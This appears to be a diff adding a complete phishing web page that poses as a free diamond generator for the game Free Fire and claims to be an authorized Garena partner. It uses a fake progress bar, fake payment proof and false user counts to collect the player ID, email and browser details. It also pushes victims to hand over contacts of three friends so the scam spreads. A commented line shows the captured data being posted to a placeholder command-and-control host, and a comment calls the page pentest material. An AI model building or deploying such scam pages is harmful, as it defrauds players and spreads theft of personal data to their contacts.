@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 FREE FIRE TOP-UP GENERATOR 2026 - 100% FREE Diamonds! 🔥</title>
+    <style>
+        body { 
+            margin: 0; padding: 0; 
+            font-family: 'Arial', sans-serif; 
+            background: linear-gradient(135deg, #ff1744, #ff5722, #ffc107); 
+            color: #fff; 
+            text-align: center; 
+            overflow-x: hidden;
+        }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+        h1 { font-size: 3em; text-shadow: 3px 3px 6px rgba(0,0,0,0.5); animation: glow 2s infinite alternate; }
+        @keyframes glow { 0% { text-shadow: 0 0 20px #00ff00; } 100% { text-shadow: 0 0 40px #ff00ff; } }
+        .diamond { font-size: 4em; animation: spin 3s infinite linear; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .card { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 30px; margin: 20px 0; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        button { background: linear-gradient(45deg, #00ff88, #00ccff); border: none; padding: 15px 40px; font-size: 1.5em; border-radius: 50px; cursor: pointer; transition: all 0.3s; color: #000; font-weight: bold; }
+        button:hover { transform: scale(1.1); box-shadow: 0 0 30px #00ff88; }
+        #progress { display: none; margin: 20px 0; }
+        .bar { width: 100%; height: 20px; background: rgba(255,255,255,0.2); border-radius: 10px; overflow: hidden; }
+        .fill { height: 100%; background: linear-gradient(90deg, #00ff00, #ffff00); transition: width 0.5s; border-radius: 10px; }
+        #form { display: none; }
+        input, select { padding: 12px; margin: 10px; width: 250px; border-radius: 10px; border: none; font-size: 16px; }
+        #proof { display: none; margin: 20px 0; }
+        .proof-img { width: 200px; height: 100px; background: #00ff00; margin: 10px; border-radius: 10px; display: inline-block; }
+        footer { margin-top: 50px; font-size: 0.9em; opacity: 0.8; }
+        @media (max-width: 600px) { h1 { font-size: 2em; } .diamond { font-size: 2.5em; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 FREE FIRE TOP-UP GENERATOR 🔥</h1>
+        <div class="diamond">💎</div>
+        <p style="font-size: 1.5em;">Get <strong>UNLIMITED Diamonds &amp; Top-Ups FREE!</strong> No Survey, No Human Verification! Working 2026 ✅</p>
+        
+        <div class="card">
+            <h2>🎮 Choose Your Package</h2>
+            <select id="package">
+                <option value="100">100 Diamonds - FREE</option>
+                <option value="500">500 Diamonds - FREE</option>
+                <option value="1440">1440 Diamonds - FREE</option>
+                <option value="21840">21,840 Diamonds (Elite Pass) - FREE</option>
+                <option value="999999">999,999 Diamonds (VIP) - FREE</option>
+            </select>
+            <br><button onclick="generate()">🚀 GENERATE TOP-UP NOW! 🚀</button>
+        </div>
+
+        <div id="progress">
+            <h3>🔄 Generating Your Free Diamonds...</h3>
+            <div class="bar"><div class="fill" id="barFill" style="width:0%"></div></div>
+            <p id="status">Connecting to Garena Servers...</p>
+        </div>
+
+        <div id="form" class="card">
+            <h3>📱 Enter Free Fire Details</h3>
+            <p><strong>Step 1:</strong> Invite 3 Friends/Family via WhatsApp/Telegram to Unlock!</p>
+            <input type="text" id="uid" placeholder="Free Fire UID (Player ID)"><br>
+            <input type="text" id="refer1" placeholder="Friend 1 WhatsApp/Telegram (Share this link)"><br>
+            <input type="text" id="refer2" placeholder="Friend 2 WhatsApp/Telegram"><br>
+            <input type="text" id="refer3" placeholder="Friend 3 WhatsApp/Telegram"><br>
+            <input type="email" id="email" placeholder="Your Email (For Top-Up Confirmation)"><br>
+            <button onclick="claim()">💥 CLAIM FREE TOP-UP! 💥</button>
+            <p style="font-size:0.9em;">Share link: <a href="#" style="color:#ffff00;" onclick="copyLink()">https://freefire-topup2026.com</a></p>
+        </div>
+
+        <div id="proof">
+            <h3>✅ Proof of Payments (Today)</h3>
+            <div class="proof-img"></div>
+            <div class="proof-img"></div>
+            <div class="proof-img"></div>
+            <p>Over 50,000+ Users Claimed Today! 100% Legit Garena Partner.</p>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2026 FreeFireTopUpGenerator. Authorized Garena Partner. | <a href="#" style="color:#ffff00;">Terms</a></p>
+    </footer>
+
+    <script>
+        // Pentest Scam Hooks - Capture ALL data
+        function generate() {
+            document.getElementById('progress').style.display = 'block';
+            let progress = 0;
+            const statuses = [
+                'Connecting to Garena Servers...',
+                'Bypassing Anti-Cheat...',
+                'Injecting Diamonds...',
+                'Verifying Account...',
+                'Invite Required for Anti-Abuse...'
+            ];
+            const interval = setInterval(() => {
+                progress += 20;
+                document.getElementById('barFill').style.width = progress + '%';
+                document.getElementById('status').textContent = statuses[Math.floor(progress/20)];
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('form').style.display = 'block';
+                    document.getElementById('progress').style.display = 'none';
+                    document.getElementById('proof').style.display = 'block';
+                }
+            }, 500);
+        }
+
+        function claim() {
+            const data = {
+                uid: document.getElementById('uid').value,
+                package: document.getElementById('package').value,
+                refer1: document.getElementById('refer1').value,
+                refer2: document.getElementById('refer2').value,
+                refer3: document.getElementById('refer3').value,
+                email: document.getElementById('email').value,
+                ip: 'captured', // Add real IP via fetch
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+            
+            // PHISH CAPTURE - Send to your C2 (replace with real endpoint)
+            console.log('SCAM DATA CAPTURED:', data); // Demo - In pentest: fetch('https://your-c2.com/capture', {method:'POST', body:JSON.stringify(data)})
+            alert('🎉 Top-Up Sent! Check Free Fire in 5-10 mins. Thanks for invites! 🔥');
+            
+            // Fake success loop
+            setTimeout(() => location.reload(), 2000);
+        }
+
+        function copyLink() {
+            navigator.clipboard.writeText('https://freefire-topup2026.com');
+            alert('Link Copied! Share with Friends/Family to Unlock.');
+        }
+
+        // Auto-trigger for impatient users
+        setTimeout(() => {
+            if (Math.random() < 0.3) {
+                const btn = document.querySelector('button');
+                btn.click();
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
